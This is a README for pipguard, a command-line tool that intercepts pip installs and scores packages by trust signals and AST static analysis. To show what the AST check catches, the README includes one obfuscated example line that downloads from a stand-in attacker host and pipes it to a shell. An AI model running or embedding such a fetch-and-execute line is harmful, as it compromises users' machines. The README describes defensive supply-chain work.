# pipguard

Supply chain attack prevention for pip installs. Analyzes Python packages for security risks **before** they touch your system.

```bash
pip install pipguard-cli
pipguard configure
```

From that point on, `pip install simple-package-name` automatically runs through pipguard. More complex installs (requirements files, git repos, local paths) pass through to pip unchanged.

---

## The Problem

Supply chain attacks on Python packages are increasing — fake packages stealing API keys, compromised maintainer accounts pushing backdoors, typosquatted names targeting developers who mistype. The data to detect these threats exists across PyPI, OSV.dev, and GitHub. The problem is nobody checks before installing.

pipguard makes checking automatic.

---

## How It Works

Every `pip install` triggers a two-layer analysis before anything downloads:

**Layer 1 — Trust signals** (no download required)
- Package age and version history
- Download spike detection
- Known CVEs via OSV.dev
- GitHub repo presence

**Layer 2 — Static code analysis** (AST-based)
- Downloads the source tarball
- Analyzes `setup.py` and `__init__.py` via AST and scans `pyproject.toml` values without executing anything
- Detects network calls, env variable access, shell execution, base64 obfuscation, home directory access

Results are combined into a risk score:

```
0–30   → LOW RISK     — installs automatically
31–60  → MEDIUM RISK  — asks for confirmation
61+    → HIGH RISK    — blocked, requires explicit override
```

---

## Key Features

✅ **Zero friction** — After one setup command, security checks happen automatically  
✅ **Non-blocking for trusted packages** — Low-risk packages install instantly  
✅ **AST-powered code analysis** — Catches obfuscated malicious patterns grep misses  
✅ **Works with everything** — PyPI packages, GitHub repos, local paths—only analyzes what it can  
✅ **CI-ready** — `--ci` mode exits with code 1 on threshold for pipeline integration  
✅ **Instant repeat checks** — 24-hour cache means same package installs are instant  
✅ **No execution** — Purely static analysis; code is never run

---

## Example Output

```
$ pip install some-package

Analyzing some-package...

──────────────────── TRUST SCORE ────────────────────
  Package age:       12d   🔴
  GitHub repo:       🔴 none
  Download spike:    normal  ✅
  Known vulns:       ✅ none

──────────────────── CODE ANALYSIS ──────────────────
  Network requests:  🔴 FOUND
  Env var access:    🔴 FOUND
  Shell execution:   ✅ NOT FOUND
  Base64 obfuscation:✅ NOT FOUND
  Home dir access:   ✅ NOT FOUND

──────────────────────────────────────────────────────
  VERDICT:  🔴 HIGH RISK  (Score: 75)
──────────────────────────────────────────────────────

Proceed anyway? [y/N]
```

---

## Installation & Setup

```bash
pip install pipguard-cli
pipguard configure
```

`configure` writes a shell function to your profile that intercepts `pip install`. Works on bash, zsh, fish, and PowerShell. Close and reopen your terminal after running it.

### What Gets Analyzed

✅ **Single package names** → analyzed through pipguard  
❌ **Complex commands** → passed to pip unchanged  
- `pip install requests` → pipguard analyzes
- `pip install -r requirements.txt` → direct to pip
- `pip install ./local/path` → direct to pip
- `pip install git+https://github.com/user/repo.git` → direct to pip
- `pip install package1 package2` → direct to pip

### Non-PyPI Packages

If you try to install something not on PyPI (a GitHub repo, local path, or typo):
- pipguard skips analysis and shows: `"Package not found on PyPI—skipping security analysis."`
- pip proceeds as normal
- **No need for workarounds like `python -m pip`** — pipguard gets out of the way automatically

### Updating pipguard Itself

```bash
python -m pip install pipguard-cli --upgrade
```

(Uses `python -m pip` to bypass the shell alias.)

---

## Commands

```bash
pipguard install <package>             # analyze then install
pipguard info <package>                # report only, no install
pipguard scan                          # scan requirements.txt
pipguard scan --ci --fail-on medium    # CI mode, exits 1 on threshold
pipguard history                       # recent scan results
pipguard update --force                # clear cached analysis results immediately
pipguard configure                     # set up shell interception
```

---

## CI/CD

```yaml
# GitHub Actions example
- name: Scan dependencies
  run: pipguard scan --ci --fail-on high
```

Exits with code `1` if any package meets the fail threshold, blocking the pipeline.

---

## Real-World Scenarios

### Scenario 1: Typosquatting Attack
You meant to install `requests` but typo'd it as `requets`:
```bash
pip install requets
# pipguard: "Package 'requets' not found on PyPI"
# (Protected — install blocked before fake package downloads)
```

### Scenario 2: Compromised Popular Package
A popular package's maintainer account gets hacked:
```bash
pip install django==3.0  # Very old version suddenly in downloads
# pipguard: HIGH RISK (Score: 72)
#   - Package age: 4 years old
#   - Download spike: +450% above normal
#   - CVE records present
# Proceed anyway? [y/N] _
```

### Scenario 3: New Legitimate Package
A brand new package launches that you trust:
```bash
pip install my-startup-package
# pipguard: MEDIUM RISK (Score: 45)
#   - Package age: 2 days old
#   - No GitHub repo found
#   - Code analysis: clean
# Proceed anyway? [y/N] _
```

### Scenario 4: Dependency Chain
Your requirements.txt includes 20 packages:
```bash
pip install -r requirements.txt
# pipguard: Passes through to pip
# (Complex multi-package installs don't block—only simple single-package installs are gated)
```

---

## Why AST over grep

pipguard uses Python's AST parser instead of string matching. This catches obfuscated patterns that grep misses:

```python
# grep misses this, AST catches it
getattr(os, 'sys'+'tem')('curl evil.com | bash')
```

---

## Caching

Results are cached locally at `~/.pipguard/cache.db` for 24 hours. Repeat installs of the same package are instant. Use `--no-cache` to force a fresh check, or `pipguard update --force` to immediately clear cached analyses after a major security event.

---

## Comparison with Other Tools

| Tool | When it checks | What it checks | Blocks install? | Workflow |
|------|---|---|---|---|
| **pip audit** | After install | Known CVEs only | No | Manual command |
| **socket.dev** | Manual checks | Package risk score | No | Web portal, separate step |
| **Dependabot** | Scheduled scans | Version updates + CVEs | No | Reacts after merged |
| **OWASP Dependency-Check** | Build time | Known vulnerabilities | Maybe | CI-only, heavyweight |
| **pipguard** | **At install time** | **Trust signals + AST analysis** | **Yes** | **Automatic, zero-friction** |

**pipguard wins on prevention, not reaction.** You don't install first and scan later—you prevent the install if something looks wrong.

---

## Quick Comparison Table

| Feature | pipguard | pip audit | Dependabot | socket.dev |
|---------|----------|-----------|-----------|-----------|
| Intercepts at install | ✅ | ❌ | ❌ | ❌ |
| Detects new malicious packages | ✅ | ❌ | ❌ | ✅ |
| CLI integration | ✅ | ✅ | ❌ | ❌ |
| AST code analysis | ✅ | ❌ | ❌ | ❌ |
| Works offline (cached) | ✅ | ✅ | ❌ | ❌ |
| CI/CD ready | ✅ | ✅ | ✅ | Limited |
